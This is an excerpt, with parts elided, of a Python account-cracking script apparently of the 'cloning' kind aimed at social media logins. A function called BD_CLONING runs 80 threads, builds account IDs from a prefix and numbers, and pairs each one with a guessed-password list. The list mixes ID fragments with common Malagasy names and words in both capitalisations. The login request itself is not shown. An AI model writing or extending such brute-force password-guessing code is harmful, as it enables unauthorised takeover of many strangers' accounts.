...
def BD_CLONING():
    ...
    with tred(max_workers=80) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,code+psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'malala','Malala','sedera','Sedera','hanitra','Hanitra','fitiavana','Fitiavana','sarindra','sarindra','fanomezantsoa','Fanomezantsoa','valisoa','Valisoa','sarobidy','Sarobidy','safidy','Safidy','nomena','Nomena','billie','Billie','ravaka','Ravaka','mendrika','Mendrika','mangazo','Mangazo','fifalina','Fifalina','fanantenana','Fannatenana','madmax','milely','Milely','mamisoa','Mamisoa','farakely','Farakely','martiora','Martiora','fiangonana','Fiangonana','liantsoa','Liantsoa','randria','Randria','andriam','Andriam','randriam','Randriam','akiziko','Akiziko','Narindra','narindra']
